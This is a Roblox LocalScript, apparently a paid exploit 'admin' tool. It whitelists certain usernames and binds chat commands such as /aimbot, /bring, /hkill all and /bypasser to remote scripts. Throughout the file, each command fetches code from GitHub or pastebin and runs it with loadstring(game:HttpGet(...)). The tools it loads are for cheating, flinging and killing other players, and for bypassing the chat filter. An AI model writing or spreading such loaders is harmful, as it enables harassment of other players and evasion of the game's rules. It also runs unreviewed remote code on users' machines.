-- LocalScript only
local premiumUsers = {"victorwielki", "rb0zo", "CokeYTXD", "DVXmasters748", "Doritosman2437", "Legalfruad", "rustz7", "6angelzzzz", "bacon_noobyk", "mohii03", "Yasinapel3", "urtcyrcjctyjjtcycrjy", "Shshisnishusgvgsugs", "ichbinabudi1070" }
local GuiMakers = {"victorwielki"}
local Advertisers = {"Vlafz195"}
local Scripters = {"BloxArsenal124"}
local Owners = {"IIIlIIIllIlIllIII", "AliKhammas1234", "AliKhammas"}

-- Flag to indicate if the script has been executed
if _G.ScriptExecuted then
    local player = game.Players.LocalPlayer
    local screenGui = Instance.new("ScreenGui", player.PlayerGui)
    local textLabel = Instance.new("TextLabel", screenGui)
    textLabel.Text = "You have already executed the script!"
    textLabel.Size = UDim2.new(0.5, 0, 0.1, 0)
    textLabel.Position = UDim2.new(0.25, 0, 0.45, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
    textLabel.TextScaled = true
    textLabel.TextStrokeTransparency = 0.7
    textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    textLabel.Font = Enum.Font.GothamBold

    -- Ensure notification persists for 5 seconds
    wait(5)
    screenGui:Destroy()
    return
end

-- Function to create and display a popup message with rainbow text color
local function showPopup(player, message)
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "WhitelistPopup"
    screenGui.Parent = player.PlayerGui

    local textLabel = Instance.new("TextLabel")
    textLabel.Name = "PopupLabel"
    textLabel.Text = message
    textLabel.BackgroundTransparency = 1
    textLabel.Size = UDim2.new(0.5, 0, 0.1, 0)
    textLabel.Position = UDim2.new(0.25, 0, 0.45, 0)
    textLabel.TextScaled = true
    textLabel.TextStrokeTransparency = 0.7
    textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    textLabel.Font = Enum.Font.GothamBold
    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

    local uiGradient = Instance.new("UIGradient")
    uiGradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)), -- Red
        ColorSequenceKeypoint.new(0.2, Color3.fromRGB(255, 127, 0)), -- Orange
        ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 255, 0)), -- Yellow
        ColorSequenceKeypoint.new(0.6, Color3.fromRGB(0, 255, 0)), -- Green
        ColorSequenceKeypoint.new(0.8, Color3.fromRGB(0, 0, 255)), -- Blue
        ColorSequenceKeypoint.new(1, Color3.fromRGB(75, 0, 130)) -- Indigo
    }
    uiGradient.Parent = textLabel

    textLabel.Parent = screenGui

    -- Ensure GUI is visible for 5 seconds
    wait(5)
    screenGui:Destroy()
end

-- Function to check if the player is whitelisted
local function isWhitelisted(playerName)
    return table.find(premiumUsers, playerName) or 
           table.find(GuiMakers, playerName) or 
           table.find(Advertisers, playerName) or 
           table.find(Scripters, playerName) or 
           table.find(Owners, playerName)
end

-- Function to execute commands based on player message
local function executeCommand(msg)
    if not isWhitelisted(game.Players.LocalPlayer.Name) then
        print("You are not whitelisted to use this command.")
        return
    end

    local commands = {
        ["/bring"] = "https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/Bring",
        ["/antilag"] = "https://raw.githubusercontent.com/xSejker/AntilagFixedd/main/README.md",
        ["/antibang"] = "https://pastebin.com/raw/5iSqpqf6",
        ["/chaoshub"] = "https://raw.githubusercontent.com/Vcsk/AstralHub/main/Loader.lua",
        ["/aimbot"] = "https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/aimbot",
        ["/protonadmin"] = "https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/protonadmin",
        ["/triviabooth"] = "https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/triviabooth",
        ["/walkonwalls"] = "https://raw.githubusercontent.com/sinret/rbxscript.com-scripts-reuploads-/main/WalkOnWalls",
        ["/chat"] = "https://raw.githubusercontent.com/UnknownUser2883/NotBypass/main/Haha",
        ["/bbhub"] = "https://raw.githubusercontent.com/Salmon-B0T/SalmonHub/main/SalmonHub.lua",
        ["/getoutmyinv"] = "https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/getoutmyinv",
        ["/kronefling"] = "https://raw.githubusercontent.com/Alikhammass/antifling./main/loopfling",
        ["/gimmetools"] = "https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/gimmetools",
        ["/oof"] = "https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/oof",
        ["/cmds"] = "https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/cmds",
        ["/antilog"] = "https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/antilogger",
        ["/donttouchme"] = "https://raw.githubusercontent.com/0Ben1/fe./main/Fling%20GUI",
        ["/serverhop"] = "https://raw.githubusercontent.com/Alikhammass/emoji/main/serverhop",
        ["/afk"] = "https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/scripts/LoadstringypVvhJBq4QNz",
        ["/ftao"] = "https://raw.githubusercontent.com/BlizTBr/scripts/main/FTAP.lua",
        ["/iy"] = "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source",
        ["/emoji"] = "https://raw.githubusercontent.com/Alikhammass/emoji/main/emo",
        ["/f3x"] = "https://raw.githubusercontent.com/Alikhammass/antifling./main/F3x",
        ["/bypasser"] = "https://raw.githubusercontent.com/Synergy-Networks/products/main/BetterBypasser/loader.lua",
        ["/bladeball"] = "https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/scripts/Loader.lua",
        ["/nonofling"] = "https://raw.githubusercontent.com/Alikhammass/antifling./main/Antifling",
        ["/swordreach"] = "https://raw.githubusercontent.com/Alikhammass/emoji/main/swordreach",
        ["/byebye all"] = "https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/quickfling",
        ["/pltiger"] = "https://raw.githubusercontent.com/H17S32/Tiger_Admin/main/Tiger%20Admin%203.0",
        ["/fps"] = "https://raw.githubusercontent.com/insanedude59/MiscReleases/main/Roblox/UWPFPSBooster.lua",
        ["/rejoin"] = "https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/rejoin",
        ["/walkonvoid"] = "https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/Walkonvoid",
        ["/hkill all"] = "https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/Handle%20kills"
    }

    -- Check if the message is a command with the format /hkill (playerName)
    if string.sub(string.lower(msg), 1, 7) == "/hkill " then
        local targetName = string.sub(msg, 8):lower()
        local targetPlayer = game.Players:FindFirstChildWhichIsA("Player")
        
        for _, player in ipairs(game.Players:GetPlayers()) do
            if string.lower(player.DisplayName) == targetName or string.lower(player.Name) == targetName then
                targetPlayer = player
                break
            end
        end

        if targetPlayer then
            -- Execute the handle kill script with the target player
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/Handle%20kills", true))()
            print("Executed /hkill on " .. targetPlayer.Name)
        else
            print("Player not found!")
        end
    else
        local command = commands[string.lower(msg)]
        if command then
            loadstring(game:HttpGet(command, true))()
        elseif string.sub(string.lower(msg), 1, 7) == "/swalk " then
            local speedValue = tonumber(string.sub(msg, 8))
            if speedValue then
                if speedValue > 0 then
                    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = speedValue
                    print("WalkSpeed set to: " .. speedValue)
                else
                    print("WalkSpeed value must be positive!")
                end
            else
                print("Invalid speed value!")
            end
        end
    end
end

-- Function to handle player chat messages
local function onPlayerChatted(msg)
    executeCommand(msg)
end

-- Handle player character load
local function handlePlayerCharacter()
    if game.Players.LocalPlayer.Character then
        if isWhitelisted(game.Players.LocalPlayer.Name) then
            showPopup(game.Players.LocalPlayer, "You are whitelisted!")
        else
            showPopup(game.Players.LocalPlayer, "You are not whitelisted! Buy the script to get whitelisted.")
        end
    end
end

-- Connect events
game.Players.LocalPlayer.Chatted:Connect(onPlayerChatted)
game.Players.LocalPlayer.CharacterAdded:Connect(handlePlayerCharacter)

-- Ensure handling of character already in game
if game.Players.LocalPlayer.Character then
    handlePlayerCharacter()
end

-- Set the flag to indicate the script has been executed
_G.ScriptExecuted = true
